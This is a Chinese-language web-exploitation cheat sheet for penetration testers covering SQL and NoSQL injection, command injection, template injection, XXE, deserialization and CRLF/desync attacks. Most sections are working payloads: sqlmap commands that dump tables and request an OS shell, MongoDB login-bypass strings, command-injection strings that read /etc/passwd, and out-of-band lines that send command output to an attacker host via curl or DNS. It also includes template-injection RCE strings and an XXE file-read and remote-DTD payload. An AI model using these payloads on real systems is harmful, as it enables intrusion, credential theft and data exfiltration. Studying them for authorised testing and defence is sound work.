# Web 漏洞原理与利用（上）—— 注入类与代码执行

> 打点与利用链在本册；SQLi/反序列化/SSTI 等**代码特征**见 [`../../代码审计知识库/INDEX.md`](../../代码审计知识库/INDEX.md) 速查与对应语言分册。

## 1. SQL 注入

### 原理
用户输入未经过滤/参数化，拼接进 SQL 语句，改变了语句结构。核心判断方法：插入单引号/注释观察报错、布尔差异、时间延迟。

### 类型与利用要点

| 类型 | 特征 | 利用方式 |
| --- | --- | --- |
| 联合查询注入 | 页面回显查询结果 | `order by N` 定列数 → `union select 1,2,database()` |
| 报错注入 | 回显数据库错误 | `updatexml(1,concat(0x7e,(select database())),1)` |
| 布尔盲注 | 页面只有真/假两种状态 | 二分法逐字符猜解 |
| 时间盲注 | 无任何回显 | `and if(ascii(substr(database(),1,1))>100,sleep(3),0)` |
| 堆叠注入 | 支持多语句（PDO 多语句、SQL Server） | `;insert/update`、MSSQL `;exec xp_cmdshell` |
| 二次注入 | 输入先入库，后续功能处拼接触发 | 注册恶意用户名 → 修改密码功能触发 |
| 宽字节注入 | GBK 系编码吃掉转义反斜杠 | `%df%27` 绕过 addslashes |

### sqlmap 实战命令

```bash
sqlmap -u "http://t.com/a.php?id=1" --batch --dbs
sqlmap -u "http://t.com/a.php?id=1" -D dbname -T users --dump
sqlmap -r req.txt --level 5 --risk 3 --technique=BEUST --batch   # 打 POST/复杂点
sqlmap -u "http://t.com/" --data "id=1" --tamper=space2comment,randomcase --delay 1  # WAF 绕过
sqlmap -u "http://t.com/a.php?id=1" --os-shell                    # 需 DBA + 可写目录
```

要点：`--technique` 控制探测类型加速；高 level/risk 配合 `--threads` 谨慎；WAF 环境先 `--identify-waf` 再选 tamper。

### NoSQL 注入

```text
# MongoDB 认证绕过
username[$ne]=1&password[$ne]=1
{"$gt": ""} 注入 JSON 体；/api/login 传 {"user":{"$regex":"^admin"},"pass":{"$ne":""}}
```

## 2. 命令注入

原理：用户输入拼接进系统命令。识别：参数值疑似文件名/IP/工具参数时重点测。

```bash
# 常用载荷（绕过空格/过滤）
127.0.0.1;id
127.0.0.1|id
`id`  $(id)
%0aid                                    # 换行绕过
ca${IFS}t${IFS}/etc/passwd               # ${IFS} 代替空格
c'a't /et'c'/passw?                      # 引号/通配符绕关键字
# 无回显外带：DNS 外带
`id|base64`.xxxx.dnslog.cn               # 或 curl http://vps/`id|base64`
```

## 3. 服务端模板注入（SSTI）

识别：`{{7*7}}`、`${7*7}`、`<%= 7*7 %>` 回显 49 即存在。指纹探测矩阵：

| 引擎 | 语言 | 探测/RCE 载荷示例 |
| --- | --- | --- |
| Jinja2 / Twig | `{{7*'7'}}` → 49 是 Jinja2，7777777 是 Twig | Jinja2: `{{''.__class__.__mro__[2].__subclasses__()}}` 链到 popen |
| Freemarker / Velocity | Java `${...}` / `#set` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Smarty | PHP | `{system('id')}` |

## 4. XXE（XML 外部实体注入）

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

- 出现在：XML 接口、SOAP、docx/xlsx 上传解析、SVG 上传。
- 无回显时用 OOB：`SYSTEM "http://vps/xxe.dtd"` 加载远程 DTD 外带数据。
- 常见防护绕过：参数实体、编码（UTF-16）、协议白名单中的 `php://filter`。

## 5. 反序列化

| 语言 | 识别特征 | 利用 |
| --- | --- | --- |
| Java | 流量中 `rO0AB`（base64）/`AC ED 00 05`（hex） | ysoserial 链（CommonsCollections、CB1）配合中间件特征选链 |
| PHP | `O:4:"User":2:{...}` | 找 `__wakeup/__destruct` POP 链，phpggc 生成 |
| .NET | `AAEAAAD/////` | ysoserial.net，ViewState 重点关注 |
| Python | pickle `K...\x80` | `__reduce__` 反弹 |

使用场景：Shiro（rememberMe，见 09 漏洞库）、Weblogic/JBoss/Fastjson/Jackson 参数、session 文件、消息队列。

## 6. HTTP Header Injection → 请求拆分 / Desync（2026-08 加厚）

> 来源精读：PortSwigger *CRLF-Powered Desync Attacks*（与 TurtleSec 合作，BHUSA/DEFCON 公开）。  
> 纪律：只写识别与升格条件；不写可打穿生产的完整蠕虫载荷。

- **危险特征**：用户输入进入请求行/头（路径拼接、自定义上游头、日志/追踪头回写）且未剥离 `CR`/`LF`（`%0d%0a`）。
- **升格路径**：Header Injection → HTTP Request Splitting → CL.TE / 浏览器侧 IP·连接锁定 desync → 缓存投毒、隧道绕过访问控制、甚至 desync「蠕虫化」传播面。
- **打点自测**：① 找「输入出现在下游 HTTP 头」的点；② 注入单行换行看是否拆出第二个请求特征；③ 有 CDN/反代时优先测前后端解析差异（不要只测反射 XSS）。
- **回链**：审计侧见综合分册「CTF 拾遗」；红队认证/API 面见 `03-API与认证攻击面.md`。

## 自测锚点

- [ ] 能手写布尔盲注与时间盲注的逐字符猜解脚本（不依赖 sqlmap）。
- [ ] 能说明堆叠注入为什么能直接 RCE，并举一个中间件例子。
- [ ] 看到 `rO0AB` 能立即说出接下来的完整利用链（选链 → 生成 → 投递 → 回显/反弹）。
- [ ] 能说明「CRLF 头注入」为何可能升格为请求走私/desync，而不只是 XSS。
